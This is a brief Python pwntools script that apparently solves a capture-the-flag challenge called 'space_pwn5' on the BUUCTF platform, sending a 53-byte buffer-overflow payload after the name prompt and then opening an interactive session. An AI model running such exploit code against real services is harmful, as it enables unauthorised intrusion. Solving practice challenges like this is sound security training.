#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote('node3.buuoj.cn',28373)
#p = process('./space_pwn5')
elf = ELF('./space_pwn5')
context.log_level='debug'


payload = '\x11' * 53
p.recvuntil("What's your name?\n")
p.sendline(payload)

p.interactive()
